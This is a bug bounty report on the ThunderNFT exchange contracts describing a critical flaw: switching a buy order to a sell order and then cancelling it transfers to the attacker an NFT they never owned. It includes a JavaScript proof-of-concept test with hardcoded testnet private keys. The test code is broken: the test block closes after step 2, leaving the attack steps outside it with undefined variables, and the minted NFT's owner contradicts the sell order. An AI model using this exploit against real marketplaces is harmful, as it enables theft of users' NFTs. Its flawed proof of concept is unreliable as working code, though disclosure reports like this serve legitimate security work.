# IOP \_ ThunderNFT 34980 - \[Smart Contract - Critical] Order side manipulation can lead to theft of NF

Submitted on Mon Sep 02 2024 07:14:37 GMT-0400 (Atlantic Standard Time) by @Solosync6 for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34980

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description

## Brief/Intro

The `ThunderExchange` contract contains a critical vulnerability that could allow an attacker to manipulate buy/sell order and potentially gain unauthorized ownership of NFTs.

This vulnerability stems from insufficient checks during order updates and cancellations, particularly when changing an order from buy to sell.

## Vulnerability Details

The vulnerability exists in the interaction between the `update_order` and `cancel_order` functions. Here's a step-by-step breakdown:

1. An attacker can place a buy order at a very low price for an NFT they don't own. All they need to do is to make sure they have pool balance greater than order price:

```rust
fn place_order(order_input: MakerOrderInput) {
    _validate_maker_order_input(order_input);
    // ... (no NFT transfer for buy orders)
    strategy.place_order(order);
}
```

2. Attacker can then update this buy order to a sell order:

```rust
fn update_order(order_input: MakerOrderInput) {
    _validate_maker_order_input(order_input);
    // ... (no NFT ownership check)
    match order.side {
        Side::Buy => {
            // ... (check pool balance)
        },
        Side::Sell => {}, // No checks for sell orders
    }
    strategy.update_order(order);
}
```

Note that changing sides is allowed in `_validate_maker_order_input`. Also, crucially, there is no check if the attacker indeed owns the NFT if order side is changed.

3. The attacker can then cancel this "sell" order:

```rust
fn cancel_order(strategy: ContractId, nonce: u64, side: Side) {
    // ...
    let order = strategy_caller.get_maker_order_of_user(caller, nonce, side);
    match side {
        Side::Sell => {
            if (order.is_some()) {
                // ... (cancel order in strategy)
                transfer(                                                           
                    Identity::Address(unwrapped_order.maker),
                    AssetId::new(unwrapped_order.collection, unwrapped_order.token_id),
                    unwrapped_order.amount
                );                      
            }
        },
    }
}
```

Note that on cancellation, the NFT asset is transferred back to the maker, only this time, the maker was never the original owner of the NFT.

The vulnerability arises because:

* There's no check to prevent changing order sides during updates.
* There's no verification of NFT ownership when updating to a sell order.
* The cancellation process trusts the strategy contract to return the correct order information without additional verification.

## Impact Details

In the worst-case scenario, an attacker could:

* Create buy orders for valuable NFTs they don't own.
* Update these to sell orders without owning the NFTs.
* Cancel these "sell" orders, potentially receiving NFTs they never owned.

This could lead to unauthorized transfer of high-value NFTs, significant financial losses for legitimate NFT owners, and a complete breakdown of trust in the marketplace.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L114>

<https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L157>

## Proof of concept

## Proof of Concept

Note: the commented test code in ThunderSDK contains old contracts that are no longer in use. All tests are commented as the function signatures in the tests don't match with the code in scope

New ABIs need to be generated for all contracts. I have created this setup using latest contracts.

```
describe("Exchange", () => {
  beforeAll(async () => {
    provider = await Provider.create("https://beta-4.fuel.network/graphql");
    owner = new WalletUnlocked(
      "0xde97d8624a438121b86a1956544bd72ed68cd69f2c99555b08b1e8c51ffd511c",
      provider
    );
    nft_owner = new WalletUnlocked(
      "0x37fa81c84ccd547c30c176b118d5cb892bdb113e8e80141f266519422ef9eefd",
      provider
    );
    user1 = new WalletUnlocked(
      "0x862512a2363db2b3a375c0d4bbbd27172180d89f23f2e259bac850ab02619301",
      provider
    );
    user2 = new WalletUnlocked(
      "0x7f8a325504e7315eda997db7861c9447f5c3eff26333b20180475d94443a10c6",
      provider
    );
    recipient = new WalletUnlocked(
      "0x976e5c3fa620092c718d852ca703b6da9e3075b9f2ecb8ed42d9f746bf26aafb",
      provider
    );

    // Deploy Exchange
    const exchangeBytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/thunder_exchange/out/debug/thunder_exchange.bin"
      )
    );
    const exchangeFactory = new ContractFactory(
      exchangeBytecode,
      ThunderExchangeAbi__factory.abi,
      owner
    );
    exchange = await exchangeFactory.deployContract();

    // Initialize Exchange
    const { transactionResult: exchangeResult } = await Exchange.initialize(
      exchange.id.toString(),
      provider.url,
      owner.privateKey
    );
    expect(exchangeResult?.status.type).toBe("success");
    const { value } = await Exchange.owner(
      exchange.id.toString(),
      provider.url
    );
    expect(value?.Address?.value).toBe(owner.address.toB256());

    // Deploy AssetManager
    const assetManagerBytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/asset_manager/out/debug/asset_manager.bin"
      )
    );
    const assetManagerFactory = new ContractFactory(
      assetManagerBytecode,
      AssetManagerAbi__factory.abi,
      owner
    );
    assetManager = await assetManagerFactory.deployContract();

    // Initialize AssetManager
    const { transactionResult } = await AssetManager.initialize(
      assetManager.id.toString(),
      provider.url,
      owner.privateKey
    );

    const baseAssetId = provider.getBaseAssetId();
    const { transactionResult: result } = await AssetManager.addAsset(
      assetManager.id.toString(),
      provider.url,
      owner.privateKey,
      baseAssetId
    );
    expect(transactionResult?.status.type).toBe("success");
    expect(result?.status.type).toBe("success");

    // Deploy Pool
    const poolBytecode = fs.readFileSync(
      path.join(__dirname, "../../../../contracts-v1/pool/out/debug/pool.bin")
    );
    const poolFactory = new ContractFactory(
      poolBytecode,
      PoolAbi__factory.abi,
      owner
    );
    pool = await poolFactory.deployContract();

    // Initialize Pool
    const { transactionResult: poolResult } = await Pool.initialize(
      pool.id.toString(),
      provider.url,
      owner.privateKey,
      exchange.id.toB256(),
      assetManager.id.toB256()
    );
    expect(poolResult.status.type).toBe("success");

    // Deploy Strategy
    const strategyBytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale.bin"
      )
    );
    const strategyFactory = new ContractFactory(
      strategyBytecode,
      StrategyFixedPriceSaleAbi__factory.abi,
      owner
    );
    strategy = await strategyFactory.deployContract();

    // Initialize Strategy
    const { transactionResult: sResult } = await Strategy.initialize(
      strategy.id.toString(),
      provider.url,
      owner.privateKey,
      exchange.id.toB256()
    );
    expect(sResult?.status.type).toBe("success");

    const { transactionResult: protocolFeeRes } = await Strategy.setProtocolFee(
      strategy.id.toString(),
      provider.url,
      owner.privateKey,
      250
    );
    expect(protocolFeeRes?.status.type).toBe("success");

    // Deploy Execution Manager
    const executionManagerBytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/execution_manager/out/debug/execution_manager.bin"
      )
    );
    const executionManagerFactory = new ContractFactory(
      executionManagerBytecode,
      ExecutionManagerAbi__factory.abi,
      owner
    );
    executionManager = await executionManagerFactory.deployContract();

    // Initialize Execution Manager
    const { transactionResult: executionManagerResult } =
      await ExecutionManager.initialize(
        executionManager.id.toString(),
        provider.url,
        owner.privateKey
      );
    const { transactionResult: addStrategy } =
      await ExecutionManager.addStrategy(
        executionManager.id.toString(),
        provider.url,
        owner.privateKey,
        strategy.id.toB256()
      );
    expect(executionManagerResult.status.type).toBe("success");
    expect(addStrategy.status.type).toBe("success");

    // Deploy Royalty Manager
    const royaltyManagerBytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/royalty_manager/out/debug/royalty_manager.bin"
      )
    );
    const royaltyManagerFactory = new ContractFactory(
      royaltyManagerBytecode,
      RoyaltyManagerAbi__factory.abi,
      owner
    );
    royaltyManager = await royaltyManagerFactory.deployContract();

    // Initialize Royalty Manager
    const { transactionResult: rmResult } = await RoyaltyManager.initialize(
      royaltyManager.id.toString(),
      provider.url,
      owner.privateKey
    );
    expect(rmResult.status.type).toBe("success");

    const { transactionResult: royaltyFeeRes } =
      await RoyaltyManager.setRoyaltyFeeLimit(
        royaltyManager.id.toString(),
        provider.url,
        owner.privateKey,
        1000
      );
    expect(royaltyFeeRes.status.type).toBe("success");

    // Deploy NFT
    const erc721Bytecode = fs.readFileSync(
      path.join(
        __dirname,
        "../../../../contracts-v1/erc721/out/debug/erc721.bin"
      )
    );

    const erc721Factory = new ContractFactory(
      erc721Bytecode,
      Erc721Abi__factory.abi,
      nft_owner
    );
    erc721 = await erc721Factory.deployContract();

    // Initialize NFT
    const { transactionResult: nftResult } = await ERC721.constructor(
      erc721.id.toString(),
      provider.url,
      nft_owner.privateKey,
      nft_owner.address.toB256()
    );
    expect(nftResult.status.type).toBe("success");

    const { transactionResult: registerRes } =
      await RoyaltyManager.registerRoyaltyInfo(
        royaltyManager.id.toString(),
        provider.url,
        nft_owner.privateKey,
        erc721.id.toB256(),
        nft_owner.address.toB256(),
        500
      );
    expect(registerRes.status.type).toBe("success");

    const nftContract = Erc721Abi__factory.connect(erc721.id, NFT_OWNER);
    const { transactionResult: mintResult } = await ERC721.mint(
      erc721.id.toString(),
      provider.url,
      nft_owner.privateKey,
      user1.address.toB256(),
      20,
      1
    );
    expect(mintResult.status.type).toBe("success");

    contracts = {
      pool: pool.id.toB256(),
      executionManager: executionManager.id.toB256(),
      royaltyManager: royaltyManager.id.toB256(),
      assetManager: assetManager.id.toB256(),
      strategyFixedPrice: strategy.id.toB256(),
      strategyAuction: strategy.id.toB256(),
    };
    Exchange.setContracts(contracts, provider);
    console.log([contracts, exchange.id.toB256(), erc721.id.toB256()]);
  }, 30000);

  it("should not allow stealing Nfts by updating buy order to sell and cancelling", async () => {
    const nftId = 20;
    const price = 1000000;

    // Step 1: NFT owner places a sell order for the NFT
    const { transactionResult: sellOrderResult } =
      await Exchange.placeSellOrder(
        exchange.id.toString(),
        provider.url,
        nft_owner.privateKey,
        {
          maker: nft_owner.address.toB256(),
          collection: erc721.id.toB256(),
          tokenId: nftId,
          price: price,
          amount: 1,
          strategy: strategy.id.toB256(),
          paymentAsset: provider.getBaseAssetId(),
          expirationRange: 1000,
        }
      );
    expect(sellOrderResult.status.type).toBe("success");

    // Step 2: User1 deposits amount in pool
    const { transactionResult: depositResult } = await Pool.deposit(
      pool.id.toString(),
      provider.url,
      user1.privateKey,
      price,
      provider.getBaseAssetId()
    );
    expect(depositResult.status.type).toBe("success");
  });

  // Step 3: User1 places a buy order for the same NFT
  const { transactionResult: buyOrderResult } = await Exchange.placeBuyOrder(
    exchange.id.toString(),
    provider.url,
    user1.privateKey,
    {
      maker: user1.address.toB256(),
      collection: erc721.id.toB256(),
      tokenId: nftId,
      price: price,
      amount: 1,
      strategy: strategy.id.toB256(),
      paymentAsset: provider.getBaseAssetId(),
      expirationRange: 1000,
    }
  );
  expect(buyOrderResult.status.type).toBe("success");

  // Step 4: User1 updates the order to sell
  const { transactionResult: updateOrderResult } = await Exchange.updateOrder(
    exchange.id.toString(),
    provider.url,
    user1.privateKey,
    {
      maker: user1.address.toB256(),
      collection: erc721.id.toB256(),
      tokenId: nftId,
      price: price,
      amount: 1,
      strategy: strategy.id.toB256(),
      paymentAsset: provider.getBaseAssetId(),
      expirationRange: 1000,
      side: "Sell",
    }
  );
  expect(updateOrderResult.status.type).toBe("success");

  // Step 5: User1 cancels the "sell" order
  const { transactionResult: cancelOrderResult } = await Exchange.cancelOrder(
    exchange.id.toString(),
    provider.url,
    user1.privateKey,
    strategy.id.toB256(),
    1, // Assuming this is the correct nonce
    "Sell"
  );
  expect(cancelOrderResult.status.type).toBe("success");

  // Step 6: Check NFT balance of user1
  const nftContract = Erc721Abi__factory.connect(erc721.id, user1);
  const balance = await nftContract.balance_of(user1.address.toB256());

  expect(Number(balance)).toBe(1);
});

```
